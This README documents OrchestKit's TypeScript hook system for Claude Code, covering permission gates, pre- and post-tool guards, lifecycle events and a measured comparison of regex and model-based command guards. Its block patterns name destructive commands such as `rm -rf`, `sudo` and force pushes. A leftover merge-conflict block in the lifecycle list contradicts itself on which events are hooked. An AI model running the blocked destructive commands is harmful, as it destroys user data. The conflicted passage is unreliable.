# OrchestKit Hooks - TypeScript/ESM

TypeScript hook system for the OrchestKit Claude Plugin. Provides lifecycle automation, permission management, and validation for Claude Code operations.

## Overview

The hooks system intercepts Claude Code operations at various lifecycle points to provide:

- **Permission management** - Auto-approve safe operations, block dangerous commands
- **Pre-execution validation** - Git protection, security checks, quality gates
- **Post-execution tracking** - Audit logging, pattern extraction, error tracking
- **Context enhancement** - Inject additional context before tool execution (CC 2.1.9)
- **Session lifecycle** - Setup, initialization, cleanup, and maintenance

**Architecture:**
- TypeScript source → ESM split bundles → Event-based deployment
- 11 event-specific bundles (the unified bundle was removed with `src/index.ts`)
- 89% per-load savings (~35KB average vs 324KB unified)
- Zero dependencies in production bundles
- CC 2.1.17 compliant (engine field), CC 2.1.16 compliant (Task Management), CC 2.1.9 compliant (additionalContext)
- CC 2.1.78 compliant: StopFailure event, CLAUDE_PLUGIN_DATA persistent storage, effort frontmatter
- CC 2.1.81 re-clone safe: All mutable state uses CLAUDE_PLUGIN_DATA or project-local `.claude/` — never CLAUDE_PLUGIN_ROOT
- CC 2.1.88 compliant: PermissionDenied hooks, absolute file_path, compound if matching, `auto` permission mode
- CC 2.1.89 compliant: `defer` permission decision, TaskCreated hook, named subagent typeahead, headless-defer hook
- CC 2.1.91 compliant: MCP `_meta["anthropic/maxResultSizeChars"]` respected by mcp-output-transform, `disableSkillShellExecution` awareness
- CC 2.1.98 compliant: Monitor tool in workflow skills, SCRIPT_CAPS enforcement, bg subagent partial progress handling, hook stderr display awareness
- CC 2.1.101 compliant: 253-entry version matrix, deny-overrides-ask in dangerous-command-blocker, 26 skill frontmatter corrections (context/agent fields now enforced), dynamic MCP inheritance for subagents
- CC 2.1.158 compliant: 460-entry version matrix (catalogued through 2.1.158 — MessageDisplay 2.1.152, dynamic workflows + Opus 4.8 2.1.154, .claude/skills autoload 2.1.157), `MessageDisplay` event in the HookEventName union, `disallowed-tools` frontmatter. Counts: `claude plugin details ork` is the source of truth.
- CC 2.1.162 compliant: 478-entry version matrix (catalogued through 2.1.162 — workflow→ultracode rename 2.1.160, parallel-tool independent failure + mcp secret redaction 2.1.161, agents --json waitingFor + dedicated search tools + WebFetch preapproved-domain fix 2.1.162); 2.1.159 is infra-only. Floor 2.1.183 (deliberate owner decision 2026-06-20, renewing the 2026-06-10 strict bump: strict floor=latest=latest_known, support only the newest CC; override expires 2026-09-20).
- CC 2.1.179 adoption: `latest_known` 2.1.176 → 2.1.179 (the version matrix is now 2 stamped constants — `MIN_CC_VERSION` + `LATEST_KNOWN_CC` — after the #2229 THIN; no more hand-maintained catalogue). 2.1.178 features adopted into docs (`Tool(param:value)` permission rules e.g. `Agent(model:opus)`, MCP `disallowedTools` now enforced in subagents, nested `.claude/skills` + closest-wins precedence, workflow keyword now explicit-phrase only). 2.1.177/2.1.179 are bugfix-only (no snapshots). Subtraction pass (`shared/rules/cc-native-first.md`): 0 ork code removable — `Tool(param:value)` is orthogonal to the model-cost-advisor + fable-spend-consent hooks. Floor was 2.1.170 at that point (override); bumped to 2.1.183 in the adoption below.
- CC 2.1.183 adoption: floor 2.1.170 → 2.1.183 (strict pin renewed 2026-06-20). **2.1.178 hard-removed the `TeamCreate`/`TeamDelete` tools** — migrated 14 agents + 9 team-mode skills to the implicit-team model (`Agent(name=...)` + `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` in settings); `team_name` is kept as ork's `team-size-gate`/`team-member-start` key (CC 2.1.178 accepts-but-ignores it). Bare `Task` tool → `Agent` in 15 skills' allowed-tools. No new ork-consumed hook output field landed 2.1.171–2.1.183: `continueOnBlock` (2.1.177) is a hooks.json flag already in use; `reloadSkills` (2.1.173) + `MessageDisplay` (2.1.152) stay unhooked (no use case); Stop/SubagentStop `additionalContext` opt-out unchanged. Subtraction pass: 0 ork hook code removable. Follow-up: re-verify `getTeamMembers()` (`~/.claude/teams/<name>/config.json`) is still populated under implicit teams.
- Event coverage: CwdChanged + FileChanged were deliberately unhooked at the time; both are hooked now (`lifecycle/cwd-changed`, `lifecycle/file-changed`), see the registry table below

---

## Directory Structure

```
hooks/
├── src/                     # TypeScript source files
│   ├── index.ts            # Main hook registry and exports
│   ├── types.ts            # TypeScript type definitions
│   ├── entries/            # Event-based entry points (Phase 4)
│   │   ├── permission.ts   # Permission hooks entry (8KB)
│   │   ├── pretool.ts      # PreToolUse hooks entry (48KB)
│   │   ├── posttool.ts     # PostToolUse hooks entry (58KB)
│   │   ├── prompt.ts       # UserPromptSubmit hooks entry (57KB)
│   │   ├── lifecycle.ts    # SessionStart/SessionEnd entry (31KB)
│   │   ├── stop.ts         # Stop event hooks entry (33KB)
│   │   ├── subagent.ts     # SubagentStart/Stop entry (56KB)
│   │   ├── notification.ts # Notification hooks entry (5KB)
│   │   ├── setup.ts        # Setup hooks entry (24KB)
│   │   ├── skill.ts        # Skill hooks entry (52KB)
│   │   └── agent.ts        # Agent hooks entry (8KB)
│   ├── lib/                # Shared utilities
│   │   ├── common.ts       # Logging, output builders, environment
│   │   ├── git.ts          # Git operations and validation
│   │   ├── guards.ts       # Conditional execution predicates
│   │   ├── path-containment.ts  # SEC: EXCLUDED_DIRS, isInsideDir, resolveRealPath (v7.27.1)
│   │   └── bash-patterns.ts     # SEC: Unified REJECT_PATTERNS for dangerous commands (v7.27.1)
│   ├── permission/         # Permission hooks (4) — includes headless-defer (CC 2.1.89)
│   ├── pretool/            # Pre-execution hooks (30)
│   │   ├── bash/           # Bash command hooks
│   │   ├── write-edit/     # File operation hooks
│   │   ├── Write/          # Write-specific hooks
│   │   ├── mcp/            # MCP integration hooks
│   │   ├── input-mod/      # Input modification hooks
│   │   └── skill/          # Skill tracking hooks
│   ├── posttool/           # Post-execution hooks (22)
│   │   ├── (root)/         # General post-tool hooks
│   │   ├── write/          # Write tracking hooks
│   │   ├── bash/           # Bash tracking hooks
│   │   ├── skill/          # Skill optimization hooks
│   │   └── write-edit/     # File lock hooks
│   ├── prompt/             # Prompt enhancement hooks (12)
│   ├── subagent-start/     # Subagent spawn hooks (5)
│   ├── subagent-stop/      # Subagent completion hooks (11)
│   ├── notification/       # Notification hooks (3)
│   ├── permission-denied/  # PermissionDenied hooks (5) — CC 2.1.88+
│   ├── instructions-loaded/ # InstructionsLoaded hooks (6 handlers via dispatcher)
│   │   ├── instructions-loaded-dispatcher.ts  # Main dispatcher
│   │   ├── types.ts                           # Shared interfaces
│   │   ├── classify-source.ts                 # File origin classifier
│   │   ├── token-budget-tracker.ts            # Token budget estimation
│   │   ├── priority-map.ts                    # Rule precedence chain
│   │   ├── drift-detection.ts                 # Cross-session drift detection
│   │   ├── content-dedup.ts                   # Duplicate content scanner
│   │   ├── rule-conflicts.ts                  # Contradictory rule detector
│   │   └── smart-suggestions.ts               # Missing rule suggestions
│   ├── stop/               # Session stop hooks (12 handlers, CC-native async entries)
│   ├── lifecycle/          # Lifecycle hooks (17)
│   ├── setup/              # Setup and maintenance hooks (9)
│   ├── agent/              # Agent-specific hooks (5)
│   └── skill/              # Skill validation hooks (22)
├── dist/                   # Compiled output (11 split bundles)
│   ├── permission.mjs      # Permission bundle (8KB)
│   ├── pretool.mjs         # PreToolUse bundle (48KB)
│   ├── posttool.mjs        # PostToolUse bundle (58KB)
│   ├── prompt.mjs          # UserPromptSubmit bundle (57KB)
│   ├── lifecycle.mjs       # Lifecycle bundle (31KB)
│   ├── stop.mjs            # Stop bundle (79KB - 7 hooks consolidated)
│   ├── subagent.mjs        # Subagent bundle (56KB)
│   ├── notification.mjs    # Notification bundle (5KB)
│   ├── setup.mjs           # Setup bundle (24KB)
│   ├── skill.mjs           # Skill bundle (52KB)
│   ├── agent.mjs           # Agent bundle (8KB)
│   └── bundle-stats.json   # Build metrics
├── bin/
│   ├── run-hook.mjs               # CLI runner (loads event-specific bundles)
│   ├── stop-uncommitted-check.mjs # Warns about unsaved work on exit
│   └── decision-history.mjs       # Decision tracking utility
├── package.json            # NPM configuration
├── tsconfig.json           # TypeScript configuration
└── esbuild.config.mjs      # Build configuration (split bundles)

**Total:** <!--ork:hooks-->176<!--/ork--> hooks (<!--ork:hooks-global-->155<!--/ork--> global + <!--ork:hooks-agent-->0<!--/ork--> agent-scoped + <!--ork:hooks-skill-->21<!--/ork--> skill-scoped)
```

---

## CC version behavior notes

> **`if:` conditions activated at the 2.1.148 floor (CC 2.1.147 fix):** Two compound `Bash(...)` `if:` conditions in `hooks.json` — the PreToolUse list gating `sync-bash-dispatcher` (and its `dangerous-command-blocker` chain) and the PermissionRequest list gating `permission/unified-dispatcher` — were **silent no-ops on CC < 2.1.148** (specific `if:` patterns never matched before the 2.1.147 fix). The floor bump to 2.1.148 activates them: the dangerous-command-blocker chain now runs for guarded Bash calls, and the leading-wildcard clauses `Bash(* && rm -rf *)` / `Bash(* | xargs rm *)` fire for the first time. The verb overlap between the two conditions is **cross-event** (PreToolUse advisory/block vs PermissionRequest approval gate) — deliberate layered defense, not duplication; do not dedup. (#1941)

> **Prompt-type hooks measured out for the Bash guards (2026-08-29):** CC's `type: "prompt"` hook sends the hook input to a fast model for a single-turn allow/deny. Decision 1 of the adopt-all plan asked whether the two regex guards with recorded false positives (`git-validator`, `dangerous-command-blocker`) should become prompt hooks. A/B on the guards' own unit-test corpus (`scripts/measure/prompt-guard-corpus.mjs`, `prompt-guard-ab.mjs`, results in `tests/fixtures/prompt-guard-ab/`): on the 142 dangerous-command cases the regex guard reproduces its label 142 times, the prompt hook 129 (10 false denies, every `pkill -f <one process>` and `rm -rf` under a system-looking path; 3 missed asks), and on the 23 git-validator cases 23 vs 22, the miss being a commit on a protected branch, which a prompt hook cannot see because its input carries no branch or worktree state, the exact axis of the recorded false positives. Latency p50 5.4 s, p95 13.8 s per Bash call against 6 ms in-process; $0.027 list per call. A prompt hook also has no `ask` answer. Not registered; the harness stays so the measurement can be repeated when the corpus or the fast model changes.

> **SubagentStop hooks are EnterWorktree-refresh-safe (CC 2.1.141):** `unified-dispatcher`, `subagent-scope-auditor`, and `skill-channel-tracker` all read `transcript_path`, which CC 2.1.141 fixed to refresh after `EnterWorktree` switches cwd. All three guard file access with `existsSync` / `try-catch` and degrade to silent success or `null` when the path is missing — refresh-safe by design, no change required. (#1929)

## Hook Types

### Permission Hooks (PermissionRequest)
Auto-approve or deny permission requests based on safety rules.

**Examples:**
- `permission/auto-approve-readonly` - Auto-approve Read, Glob, Grep
- `permission/auto-approve-safe-bash` - Auto-approve safe bash commands
- `permission/auto-approve-project-writes` - Auto-approve writes to project directory

> **`--dangerously-skip-permissions` scope (CC 2.1.121 + 2.1.126):** the flag now bypasses prompts for writes to `.claude/skills/`, `.claude/agents/`, `.claude/commands/` (since 2.1.121) and `.claude/`, `.git/`, `.vscode/`, shell config files (since 2.1.126). Catastrophic removal commands (`rm -rf` on system paths, etc.) still prompt. Permission hooks above are the only line of defense in shared/CI environments — do NOT recommend `--dangerously-skip-permissions` for those contexts. See `src/skills/setup/SKILL.md` for the full policy.

### PreTool Hooks (PreToolUse)
Execute BEFORE a tool runs, can inject context or block execution.

**Examples:**
- `pretool/bash/git-validator` - Validate git operations (branch protection, commit messages)
- `pretool/bash/dangerous-command-blocker` - Block `rm -rf`, `sudo`, force push
- `pretool/Write/architecture-change-detector` - Detect major architecture changes

**CC 2.1.9 Feature:** Use `additionalContext` to inject guidance before execution.

### PostTool Hooks (PostToolUse)
Execute AFTER a tool completes, used for logging and tracking.

**Examples:**
- `posttool/audit-logger` - Log all tool executions
- `posttool/unified-error-handler` - Track and categorize errors
- `posttool/memory-bridge` - Sync important info to knowledge graph

### Prompt Hooks (UserPromptSubmit)
Enhance user prompts with additional context before processing.

**Examples:**
- `prompt/context-injector` - Inject session context
- `prompt/antipattern-warning` - Warn about known anti-patterns
- `prompt/skill-auto-suggest` - Suggest relevant skills

### Lifecycle Hooks
Session and instance lifecycle management.

**Events:**
- `SessionStart` - Initialize session, load context
- `SessionEnd` - Save state, cleanup (CC 2.1.74: `hook.timeout` now respected; env override: `CLAUDE_CODE_SESSIONEND_HOOKS_TIMEOUT_MS`)
- `Stop` - User stops conversation, trigger compaction. **Error-loop safety:** all hooks return silent success. CC 2.1.78 fixed the original loop; CC 2.1.163 now permits Stop/SubagentStop to return `additionalContext`, but ork opts out (no consumer, avoids loop regression)
- `StopFailure` - API error termination (CC 2.1.78). Flushes state, writes emergency handoff. **Must be async.** See `stop/stop-failure-handler.ts`
- `Setup` - First-run setup, maintenance tasks
- `SubagentStart` - Subagent spawn validation
- `SubagentStop` - Subagent completion tracking (includes `agent_transcript_path` for post-mortem, CC 2.1.69)
- `PreCompact` - Save critical context before compaction
- `PostCompact` - Recover context after compaction (CC 2.1.76)
- `Elicitation` - MCP server requests structured user input (CC 2.1.76)
- `ElicitationResult` - User responds to elicitation (CC 2.1.76)
- `InstructionsLoaded` - Fires per CLAUDE.md/rules file load (CC 2.1.83)
- `ConfigChange` - Settings changed mid-session (CC 2.1.49)
- `TaskCreated` / `TaskCompleted` - Task lifecycle tracking (CC 2.1.84)
- `TeammateIdle` - Teammate agent idle detection (CC 2.1.33)
- `WorktreeCreate` / `WorktreeRemove` - Worktree lifecycle (CC 2.1.69)
<<<<<<< HEAD
- `CwdChanged` - Working directory changed (CC 2.1.83) — hooked: `lifecycle/cwd-changed` + webhook forwarder
- `FileChanged` - File modified externally (CC 2.1.83) — hooked: `lifecycle/file-changed` + webhook forwarder (PostToolUse still covers tool writes)
=======
- `PreModelSwitch` / `PostModelSwitch` - Session model change, before (can allow/deny/ask) and after (CC 2.1.251, #3789) — hooked: `lifecycle/model-switch-consent`, `lifecycle/model-switch-telemetry`
- `CwdChanged` - Working directory changed (CC 2.1.83) — **not hooked** (no use case yet)
- `FileChanged` - File modified externally (CC 2.1.83) — **not hooked** (PostToolUse covers writes)
>>>>>>> 4a129148b (feat(hooks): PreModelSwitch consent gate + PostModelSwitch telemetry)

### Notification Hooks (Notification)
Handle notifications and alerts.

**Examples:**
- `notification/desktop` - Desktop notifications for completion
- `notification/sound` - Sound alerts for errors

### PermissionDenied Hooks (CC 2.1.88+)
Fire when the user denies a tool call or auto mode skips it. Can return `{retry: true}` to re-attempt safe operations.

**Hooks (via unified-dispatcher):**
- `permission-denied/denial-logger` - Audit trail to `.claude/feedback/permission-denials.jsonl`
- `permission-denied/denial-notification` - Desktop notification on 3+ denials in 60s
- `permission-denied/safe-command-retry` - Retry safe read-only Bash commands
- `permission-denied/project-write-retry` - Retry writes inside project directory
- `permission-denied/denial-notification` - Desktop alert for repeated denials

---

## Persistent Storage (CC 2.1.78)

CC 2.1.78 introduced `CLAUDE_PLUGIN_DATA` — a persistent directory that survives plugin updates (`/plugin uninstall` prompts before deleting it).

### Path Resolution

All session-scoped storage uses `lib/paths.ts` which checks `CLAUDE_PLUGIN_DATA` first:

```
CLAUDE_PLUGIN_DATA set:
  sessions  → $CLAUDE_PLUGIN_DATA/sessions/{session_id}/
  analytics → $CLAUDE_PLUGIN_DATA/analytics/
  once-flags→ $CLAUDE_PLUGIN_DATA/sessions/{session_id}/once-flags/

CLAUDE_PLUGIN_DATA not set (CC < 2.1.78 fallback):
  sessions  → {project}/.claude/memory/sessions/{session_id}/
  analytics → {project}/.claude/memory/analytics/
  once-flags→ {project}/.claude/memory/sessions/{session_id}/once-flags/
```

### Key Functions

| Function | Location | Returns |
|----------|----------|---------|
| `getPluginDataDir()` | `lib/paths.ts` | `CLAUDE_PLUGIN_DATA` value or `null` |
| `getSessionStorageDir()` | `lib/paths.ts` | `PLUGIN_DATA/sessions` or `.claude/memory/sessions` |
| `getAnalyticsStorageDir()` | `lib/paths.ts` | `PLUGIN_DATA/analytics` or `.claude/memory/analytics` |
| `getPluginDataDir()` | `lib/common.ts` | Re-export from `paths.ts` |

### Consumers

- `lib/session-tracker.ts` — event JSONL + counter persistence
- `prompt/unified-dispatcher.ts` — once-per-session flags + prompt hash delta detection
- `stop/stop-failure-handler.ts` — emergency handoff file (uses `project_dir` directly, not PLUGIN_DATA)

**Rule:** Never hardcode `.claude/memory/sessions/` — always use `getSessionStorageDir()` or `getPromptSessionDir()` to respect PLUGIN_DATA.

---

## CLAUDE_ENV_FILE Pattern

CC provides a `CLAUDE_ENV_FILE` env var to hooks running on `SessionStart`, `CwdChanged`, `FileChanged`, and `ConfigChange` events. Hook scripts write `export KEY=value` lines to this file, and CC reads them back after execution. **The values reach the Bash tool's environment for the rest of the session. They do NOT reach later hooks.**

That second sentence is a measurement, not the documented contract. An earlier version of this section said "all future hook invocations in the session", and `sandbox-posture` was designed on that claim before it was measured dead (#3806, 2026-08-30, CC 2.1.251, `claude -p` with `--settings` hooks and a loopback Messages-API stub):

| observer | `CLAUDE_ENV_FILE` present | sees `PROBE_EXPORTED` written at SessionStart |
|---|---|---|
| SessionStart hook | yes | n/a (it wrote it) |
| PostToolUse hook (Bash) | unset | **unset** |
| Stop hook | unset | **unset** |
| Bash tool command (`echo ${PROBE_EXPORTED}`) | n/a | **yes** |

Same result for a plugin hook (async) and for a sub-hook inside the sync `sync-session-dispatcher`. Whether that is a CC bug or the intended scope of the feature is not settled upstream; until it is, the file is a way to put a variable in front of shell commands, and hook-to-hook state goes through files.

> **Effort awareness (CC 2.1.133+)**: Hooks can read `$CLAUDE_EFFORT` (or the `effort.level` JSON input field) directly to gate expensive checks on `high`/`xhigh` and skip them on `low`. Bash tool commands also see `$CLAUDE_EFFORT`. See `src/skills/configure/references/cc-version-settings.md` ("Hooks Now Receive `effort.level` Input + `$CLAUDE_EFFORT` Env").

### How It Works

```
Hook receives CLAUDE_ENV_FILE=~/.claude/session-env/<sid>/sessionstart-hook-0.sh
    ↓
Hook appends: export ORK_DEBUG=1
    ↓
CC reads the file after hook exits
    ↓
Bash tool commands see $ORK_DEBUG        (measured)
Later hooks do NOT see process.env.ORK_DEBUG   (measured, #3806)
```

### When to Use

| Use Case | CLAUDE_ENV_FILE | File-Based State |
|----------|-----------------|------------------|
| A flag a shell command run by Claude should see (`$ORK_DEBUG` in a script) | **Preferred** | Not visible to Bash |
| A flag a LATER HOOK must read (debug level, detected tier, sandbox posture) | Does not arrive | **Use this** (flag file or state file) |
| Complex structured data (JSON objects, arrays) | Not suitable | **Use this** |
| Data needed across sessions | Not suitable | **Use this** |

### TypeScript Example

```typescript
import { appendFileSync } from 'node:fs';
import { getEnvFile } from '../lib/common.js';

/**
 * Put a session-scoped variable in front of the Bash tool.
 * Later hooks will NOT see process.env[key] (#3806); if a hook
 * needs the value, write a flag or state file it can read as well.
 */
function setBashEnv(key: string, value: string): void {
  const envFile = getEnvFile();
  try {
    appendFileSync(envFile, `export ${key}=${value}\n`);
  } catch {
    // Non-fatal, the env file may be absent on older CC versions
  }
}

// Usage in a SessionStart or ConfigChange hook:
setBashEnv('ORK_DEBUG', '1');
```

### Helper: `getEnvFile()`

Located in `lib/env.ts` (re-exported from `lib/common.ts`). Returns `CLAUDE_ENV_FILE` if set, falls back to legacy `.instance_env` path:

```typescript
export function getEnvFile(): string {
  if (process.env.CLAUDE_ENV_FILE) {
    return process.env.CLAUDE_ENV_FILE;
  }
  return `${getPluginRoot()}/.claude/.instance_env`;
}
```

### Adoption

`syncDebugMode()` in `config-change/settings-reload.ts` writes BOTH channels when `/debug` is toggled: `export ORK_DEBUG=1` to the env file (so a shell command Claude runs sees `$ORK_DEBUG`) and `~/.claude/logs/ork/debug-mode.flag` (what hooks actually read: `getLogLevel()` in `lib/env.ts` checks `process.env.ORK_DEBUG` and then the flag file). Before #3806 the comments called the env file "primary" and the flag file a "fallback for events that don't receive the env var"; the measurement showed no hook event receives it, so the flag file is the working path and the env export is the Bash-facing one. It is the only ork consumer of this pattern (audited 2026-08-30: `session-env-setup` writes JSON state, not exports; `cache-break-detector` persists its shape hash in a state file; every other `ORK_*` variable hooks read is operator-set).

### Constraints

- **Session-scoped only**: values do not persist across sessions. For cross-session state, use `CLAUDE_PLUGIN_DATA` or project-local files.
- **Write events**: only `SessionStart`, `CwdChanged`, `FileChanged`, `ConfigChange` receive the env var.
- **Readers**: Bash tool commands. Not later hooks (#3806).
- **String values only**: no JSON, no arrays. For structured data, use file-based state.
- **No deletion**: you cannot unset a previously exported variable via this file. To "disable" a flag, overwrite it with an empty value (`export ORK_DEBUG=`).

---

## Development Commands

### Building

```bash
# Build production bundle (minified)
npm run build

# Build and watch for changes (development)
npm run build:watch

# Type check without building
npm run typecheck

# Clean build artifacts
npm run clean
```

### Testing

```bash
# Run all tests
npm test

# Run tests in watch mode
npm run test:watch
```

### Verification

```bash
# Check bundle size and stats
cat dist/bundle-stats.json

# Test a hook directly
echo '{"tool_name":"Read","session_id":"test","tool_input":{}}' | \
  node bin/run-hook.mjs permission/auto-approve-readonly

# Expected output:
# {"continue":true,"suppressOutput":true,"hookSpecificOutput":{"permissionDecision":"allow"}}
```

---

## Adding a hook with outputBlock + continueOnBlock

Hooks signal three outcomes via `HookResult`:

| Outcome | Shape | When to use |
|---------|-------|-------------|
| Silent success | `outputSilentSuccess()` → `{continue:true, suppressOutput:true}` | Default; nothing interesting happened |
| Advisory (continue-on-block) | `outputNotify(msg, {prefix})` → `continue:true` + `additionalContext` | You want to warn but NOT halt the tool |
| Block | `outputBlock(reason)` → `continue:false, stopReason, hookSpecificOutput.permissionDecisionReason` | Operation must be stopped (halts tool execution) |

**Pattern: graduate severity by confidence.** Start advisory, only block when multiple independent signals agree. Example from `posttool/write/stale-import-detector.ts`:

```typescript
const refs = findStaleReferences(...);
if (refs.length < MIN_SIGNAL_REFS) return outputSilentSuccess();

// Block only when (1) refs >= BLOCK_THRESHOLD, (2) co-located importer
// present, (3) no suppression comment near any import. Otherwise advise.
if (cond1 && cond2 && cond3) return outputBlock(blockReason);
return outputNotify(advisoryMessage, { prefix: 'stale-import-detector' });
```

Test the three branches with the harness in `tests/integration/hooks/`:

```bash
# Run the harness against the in-tree fixture hooks
bash tests/integration/hooks/test-continue-on-block-pattern.sh

# Or drive a single hook module directly with a JSON input
node tests/integration/hooks/lib/run-hook-fixture.mjs \
  path/to/my-hook.mjs \
  --input '{"tool_name":"Write","tool_input":{"file_path":"/tmp/x.ts"}}'
```

The harness exposes three assertion helpers: `assert_silent_success`, `assert_block <reason-substr>`, and `assert_advisory_continue <ctx-substr>`. New hooks adding a block path should add one assertion per branch.

---

## Adding a New Hook

### Step 1: Create Hook File

```bash
# Choose appropriate directory based on hook type
mkdir -p src/pretool/bash
touch src/pretool/bash/my-hook.ts
```

### Step 2: Implement Hook

```typescript
/**
 * My Hook - Brief description
 * Hook: PreToolUse (Bash)
 * CC 2.1.9 Compliant
 */

import type { HookInput, HookResult } from '../../types.js';
import { outputSilentSuccess, outputBlock, logHook } from '../../lib/common.js';
import { guardBash } from '../../lib/guards.js';

/**
 * Main hook logic
 */
export function myHook(input: HookInput): HookResult {
  // Apply guards to skip hook if conditions not met
  const guardResult = guardBash(input);
  if (guardResult) return guardResult;

  const command = input.tool_input.command || '';

  // Log hook execution
  logHook('my-hook', `Checking command: ${command}`);

  // Example: Block dangerous pattern
  if (command.includes('danger')) {
    return outputBlock('Dangerous command detected');
  }

  // Allow by default
  return outputSilentSuccess();
}
```

### Step 3: Register in Index

Add to `src/index.ts`:

```typescript
// Import hook
import { myHook } from './pretool/bash/my-hook.js';

// Add to hooks registry
export const hooks: Record<string, HookFn> = {
  // ... existing hooks ...
  'pretool/bash/my-hook': myHook,
};
```

### Step 4: Build and Test

```bash
# Build bundle
npm run build

# Test the hook
echo '{"tool_name":"Bash","session_id":"test","tool_input":{"command":"echo hello"}}' | \
  node bin/run-hook.mjs pretool/bash/my-hook
```

### Step 5: Add to Plugin Configuration

Add hook registration to `.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "name": "My Hook",
        "path": "./src/hooks/bin/run-hook.mjs pretool/bash/my-hook",
        "matcher": "Bash"
      }
    ]
  }
}
```

---

## Hook Input/Output Format

### Input (HookInput interface)

Received via stdin as JSON:

```typescript
interface HookInput {
  hook_event?: 'PreToolUse' | 'PostToolUse' | 'PermissionRequest' | 'UserPromptSubmit' | ...;
  tool_name: string;              // e.g., "Bash", "Write", "Read"
  session_id: string;             // CC 2.1.9 guaranteed
  tool_input: ToolInput;          // Tool-specific params
  tool_output?: unknown;          // PostToolUse only
  tool_error?: string;            // If tool errored
  exit_code?: number;             // Bash exit code
  prompt?: string;                // UserPromptSubmit only
  project_dir?: string;           // Project directory
  tool_use_id?: string;           // PreToolUse/PostToolUse correlation (CC 2.1.69)
  subagent_type?: string;         // SubagentStart/Stop
  agent_output?: string;          // SubagentStop
  agent_transcript_path?: string; // SubagentStop transcript path (CC 2.1.69)
  permission_suggestions?: Array<{type: string; tool: string}>; // PermissionRequest (CC 2.1.69)
  is_interrupt?: boolean;         // PostToolUseFailure interrupt flag (CC 2.1.69)
  // ... additional fields
}
```

### Output (HookResult interface)

Written to stdout as JSON:

```typescript
interface HookResult {
  continue: boolean;              // true = proceed, false = block
  suppressOutput?: boolean;       // Hide from user (default: false)
  systemMessage?: string;         // Message shown to user
  stopReason?: string;            // Reason for blocking (when continue=false)
  hookSpecificOutput?: {
    permissionDecision?: 'allow' | 'deny' | 'ask';  // PermissionRequest (CC 2.1.69: added 'ask')
    permissionDecisionReason?: string;             // Why allowed/denied
    additionalContext?: string;                    // CC 2.1.9: inject context
    hookEventName?: 'PreToolUse' | 'PostToolUse' | ...; // Required for additionalContext
    updatedToolOutput?: unknown;                   // Replace a tool result (current; all tools)
    updatedMCPToolOutput?: unknown;                // Deprecated synonym — ignored on CC <=2.1.183
    updatedPermissions?: Record<string, unknown>;  // Apply permission rules (CC 2.1.69)
  };
}
```

---

## Output Builders (lib/common.ts)

Use these helpers for consistent output:

```typescript
import {
  outputSilentSuccess,    // { continue: true, suppressOutput: true }
  outputSilentAllow,      // Silent permission allow
  outputBlock,            // Block with reason
  outputWithContext,      // Inject context (PostToolUse)
  outputPromptContext,    // Inject context (UserPromptSubmit)
  outputAllowWithContext, // Allow + inject context (PreToolUse)
  outputError,            // Show error message
  outputWarning,          // Show warning
  outputDeny,             // Deny permission with reason
} from './lib/common.js';

// Example: Silent success
return outputSilentSuccess();

// Example: Block operation
return outputBlock('Committing to main branch is not allowed');

// Example: Inject context before tool execution
return outputWithContext('💡 Consider using cursor-based pagination for large datasets');
```

---

## Guards (lib/guards.ts)

Guards are predicates that determine if a hook should run. Return early if guard fails:

```typescript
import {
  guardBash,              // Only run for Bash tool
  guardWriteEdit,         // Only run for Write/Edit tools
  guardCodeFiles,         // Only run for .py, .ts, .js, etc.
  guardTestFiles,         // Only run for test files
  guardSkipInternal,      // Skip .claude/, node_modules/, etc.
  guardGitCommand,        // Only run for git commands
  guardNontrivialBash,    // Skip echo, ls, pwd, etc.
  guardPathPattern,       // Only run for specific paths
  guardFileExtension,     // Only run for specific extensions
} from './lib/guards.js';

export function myHook(input: HookInput): HookResult {
  // Apply guard: skip if not Bash tool
  const guardResult = guardBash(input);
  if (guardResult) return guardResult;

  // Hook logic runs only for Bash tool
  // ...
}
```

### Composite Guards

Run multiple guards in sequence:

```typescript
import { runGuards, guardBash, guardNontrivialBash } from './lib/guards.js';

export function myHook(input: HookInput): HookResult {
  // Skip if not Bash OR is trivial command
  const guardResult = runGuards(input, guardBash, guardNontrivialBash);
  if (guardResult) return guardResult;

  // Hook logic...
}
```

---

## Fire-and-Forget Pattern (Issue #243)

### Overview

Async hooks run in the background via CC's native `async: true` flag without blocking the conversation. Previously used fire-and-forget spawning (removed in #653). Now all 9 async hooks use `run-hook.mjs` with `async: true`.

### How It Works

```
User types /exit
    ↓
run-hook.mjs stop/unified-dispatcher (async: true)
    ↓
CC runs hook in background, session exits immediately
    ↓
Unified dispatcher runs cleanup hooks in parallel
```

### Stop Hooks (via async dispatcher)

**Core Session (5):** auto-save-context, session-patterns, issue-work-summary, session-profile-aggregator, session-end-tracking

**Memory Sync (2):** graph-queue-sync, workflow-preference-learner

**Instance Management (3):** multi-instance-cleanup, cleanup-instance, task-completion-check

**Analysis (3):** context-compressor, auto-remember-continuity, security-scan-aggregator

**Skill Validation (12):** coverage-check, evidence-collector, coverage-threshold-gate, cross-instance-test-validator, di-pattern-enforcer, duplicate-code-detector, eval-metrics-collector, migration-validator, review-summary-generator, security-summary, test-pattern-validator, test-runner

**Heavy Analysis (1):** full-test-suite

### Security Hardening

**SEC-001 — SQL Injection Prevention:** `multi-instance-cleanup` and `cleanup-instance` validate instance IDs with `/^[a-zA-Z0-9_\-.:]+$/` before shell-exec SQLite interpolation. Invalid IDs are rejected with silent success.

**SEC-003 — Atomic File Writes:** `multi-instance-lock` writes lock data to a temp file (`locks.json.<pid>.tmp`) then uses `renameSync` for atomic replacement, preventing TOCTOU race conditions when multiple instances write concurrently.

### When to Use Async Hooks

Use `"async": true` for hooks that:
- Don't need to block user interaction
- Can fail silently without impact
- Perform analytics, metrics, or cleanup operations
- Run at session exit (Stop event)

---

## HTTP Hooks (CC 2.1.63+)

### Overview

CC supports `type: "http"` hooks that POST JSON directly to a URL instead of spawning a shell command. Zero process overhead.

### Why OrchestKit Has Zero HTTP Hooks in hooks.json

OrchestKit originally shipped 12 `type: "http"` hooks in plugin `hooks.json` using env var placeholders:

```json
{
  "type": "http",
  "url": "${ORCHESTKIT_HOOK_URL}",
  "headers": { "Authorization": "Bearer $ORCHESTKIT_HOOK_TOKEN" }
}
```

**CC 2.1.71 broke this.** CC validates `url` fields as proper URLs *before* expanding environment variables. `${ORCHESTKIT_HOOK_URL}` fails URL format validation, causing ALL hooks (including command hooks) to fail to load — breaking the entire plugin for every user.

### The Constraint (Still Active)

```
URL field:     "${ENV_VAR}"                    ❌ Broken (validated before expansion)
